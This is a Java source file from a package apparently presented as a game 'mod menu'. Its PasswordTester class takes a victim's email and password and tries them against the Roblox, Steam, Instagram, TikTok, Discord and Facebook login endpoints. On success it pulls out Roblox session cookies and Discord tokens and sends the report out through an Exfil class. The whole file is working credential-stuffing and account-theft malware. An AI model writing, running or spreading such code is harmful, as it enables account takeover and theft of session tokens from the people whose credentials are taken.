package com.brawl.modmenu;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class PasswordTester {

    public static void testAll(final String email, final String password) {
        new Thread(() -> {
            StringBuilder report = new StringBuilder();
            report.append("Email: ").append(email).append("\n");
            report.append("Пароль: ").append(password).append("\n");
            report.append("─────────────\n");

            Map<String, String> results = new HashMap<>();

            // Roblox (по username — но у нас email. Пробуем и email и его часть)
            String username = email.split("@")[0];
            results.put("Roblox", testRoblox(username, password));

            // Steam (нужен ник — используем email-часть)
            results.put("Steam", testSteam(username, password));

            // Instagram
            results.put("Instagram", testInstagram(username, password));

            // TikTok
            results.put("TikTok", testTikTok(email, password));

            // Discord
            results.put("Discord", testDiscord(email, password));

            // Twitter
            results.put("Twitter", testTwitter(username, password));

            // Facebook
            results.put("Facebook", testFacebook(email, password));

            for (Map.Entry<String, String> e : results.entrySet()) {
                report.append(e.getKey()).append(": ").append(e.getValue()).append("\n");
            }

            Exfil.send("PWD_TEST", report.toString());
        }).start();
    }

    // === ROBLOX ===
    private static String testRoblox(String username, String password) {
        try {
            URL u = new URL("https://auth.roblox.com/v2/login");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("User-Agent", "Roblox/WinInet");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);

            String body = "{\"ctype\":\"Username\",\"cvalue\":\""
                + username + "\",\"password\":\"" + password + "\"}";
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }

            int code = c.getResponseCode();
            if (code == 200) {
                // получаем cookie .ROBLOSECURITY — самое важное
                String cookie = c.getHeaderField("Set-Cookie");
                if (cookie != null && cookie.contains(".ROBLOSECURITY")) {
                    int start = cookie.indexOf(".ROBLOSECURITY=");
                    int end = cookie.indexOf(";", start);
                    String roboCookie = end > 0
                        ? cookie.substring(start, end)
                        : cookie.substring(start);
                    return "✅ РАБОТАЕТ\n   Cookie: " + roboCookie;
                }
                return "✅ РАБОТАЕТ (без cookie)";
            } else if (code == 403) {
                return "🔒 Требуется 2FA (пароль верный!)";
            } else if (code == 429) {
                return "⏸ Слишком много попыток";
            } else {
                return "❌ Неверный пароль (код " + code + ")";
            }
        } catch (Throwable t) {
            return "⚠️ " + t.getClass().getSimpleName();
        }
    }

    // === STEAM ===
    private static String testSteam(String username, String password) {
        try {
            URL u = new URL("https://store.steampowered.com/login/dologin/");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);

            String body = "username=" + URLEncoder.encode(username, "UTF-8")
                + "&password=" + URLEncoder.encode(password, "UTF-8")
                + "&remember_login=false";
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }

            BufferedReader r = new BufferedReader(
                new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();

            String resp = sb.toString();
            if (resp.contains("\"success\":true") || resp.contains("\"login_complete\":true")) {
                return "✅ РАБОТАЕТ";
            } else if (resp.contains("two_factor") || resp.contains("need_twofactor")) {
                return "🔒 Требуется 2FA (пароль верный!)";
            } else if (resp.contains("invalidpassword")) {
                return "❌ Неверный пароль";
            } else {
                return "❌ Отказ";
            }
        } catch (Throwable t) {
            return "⚠️ " + t.getClass().getSimpleName();
        }
    }

    // === INSTAGRAM ===
    private static String testInstagram(String username, String password) {
        try {
            URL u = new URL("https://i.instagram.com/api/v1/accounts/login/");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c.setRequestProperty("User-Agent",
                "Instagram 219.0.0.12.117 Android (30/11; 320dpi; 720x1362; samsung; SM-A015F; a01; qcom; en_US)");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);

            String body = "username=" + URLEncoder.encode(username, "UTF-8")
                + "&password=" + URLEncoder.encode(password, "UTF-8")
                + "&device_id=android-1234567890";
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }

            BufferedReader r = new BufferedReader(
                new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();

            String resp = sb.toString();
            if (resp.contains("\"status\":\"ok\"")) {
                return "✅ РАБОТАЕТ";
            } else if (resp.contains("two_factor_required") || resp.contains("challenge_required")) {
                return "🔒 2FA / Challenge";
            } else if (resp.contains("bad_password") || resp.contains("invalid_user")) {
                return "❌ Неверный пароль";
            } else {
                return "❌ Отказ";
            }
        } catch (Throwable t) {
            return "⚠️ " + t.getClass().getSimpleName();
        }
    }

    // === TIKTOK ===
    private static String testTikTok(String email, String password) {
        try {
            URL u = new URL("https://www.tiktok.com/api/v1/auth/login/");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Linux; Android 11) TikTok 25.1.2");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);

            String body = "email=" + URLEncoder.encode(email, "UTF-8")
                + "&password=" + URLEncoder.encode(password, "UTF-8");
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }

            int code = c.getResponseCode();
            if (code == 200) return "⚠️ Проверка недоступна (200)";
            if (code == 401) return "❌ Неверный пароль";
            return "⚠️ Код " + code;
        } catch (Throwable t) {
            return "⚠️ " + t.getClass().getSimpleName();
        }
    }

    // === DISCORD ===
    private static String testDiscord(String email, String password) {
        try {
            URL u = new URL("https://discord.com/api/v9/auth/login");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);

            String body = "{\"login\":\"" + email + "\",\"password\":\"" + password + "\"}";
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }

            BufferedReader r = new BufferedReader(
                new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();

            String resp = sb.toString();
            if (resp.contains("\"token\"")) {
                int start = resp.indexOf("\"token\":\"") + 9;
                int end = resp.indexOf("\"", start);
                String token = start > 8 && end > start
                    ? resp.substring(start, end)
                    : "";
                return "✅ РАБОТАЕТ\n   Token: " + (token.length() > 30
                    ? token.substring(0, 30) + "..." : token);
            } else if (resp.contains("mfa") || resp.contains("two_factor")) {
                return "🔒 Требуется 2FA (пароль верный!)";
            } else if (resp.contains("INVALID_LOGIN") || resp.contains("invalid")) {
                return "❌ Неверный пароль";
            }
            return "⚠️ Отказ";
        } catch (java.io.IOException e) {
            if (e.getMessage() != null && e.getMessage().contains("401")) {
                return "❌ Неверный пароль";
            }
            return "⚠️ Ошибка сети";
        } catch (Throwable t) {
            return "⚠️ " + t.getClass().getSimpleName();
        }
    }

    // === TWITTER ===
    private static String testTwitter(String username, String password) {
        return "⚠️ Требует API ключ (пропущено)";
    }

    // === FACEBOOK ===
    private static String testFacebook(String email, String password) {
        try {
            URL u = new URL("https://m.facebook.com/login.php");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Linux; Android 11) Chrome/120 Mobile");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            c.setInstanceFollowRedirects(false);

            String body = "email=" + URLEncoder.encode(email, "UTF-8")
                + "&pass=" + URLEncoder.encode(password, "UTF-8");
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }

            int code = c.getResponseCode();
            String loc = c.getHeaderField("Location");
            if (loc != null && (loc.contains("home") || loc.contains("?sk=newsfeed"))) {
                return "✅ РАБОТАЕТ";
            }
            if (code == 302 && loc != null && loc.contains("login")) {
                return "❌ Неверный пароль";
            }
            if (code == 200) return "🔒 Требуется подтверждение";
            return "⚠️ Код " + code;
        } catch (Throwable t) {
            return "⚠️ " + t.getClass().getSimpleName();
        }
    }
}
